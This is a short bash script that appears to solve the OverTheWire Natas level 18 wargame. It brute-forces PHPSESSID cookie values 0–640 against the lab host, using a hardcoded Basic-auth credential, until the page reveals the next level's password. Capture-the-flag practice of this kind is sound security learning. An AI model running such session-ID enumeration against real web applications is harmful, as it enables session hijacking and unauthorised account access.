#!/bin/bash

for i in {0..640}; do
   output=$(curl --path-as-is -i -s -k -X $'GET' -H $'Authorization: Basic bmF0YXMxODo4TkVEVVV4ZzhrRmdQVjg0dUx3dlprR242b2tKUTZhcQ==' -b "PHPSESSID=$i" $'http://natas18.natas.labs.overthewire.org/index.php?debug')
   if echo "$output" | grep "The credentials for the next level are" >/dev/null; then
      echo "matched. PHPSESSID = $i"
      break
   else
      echo "did not match. PHPSESSID = $i"
   fi
done
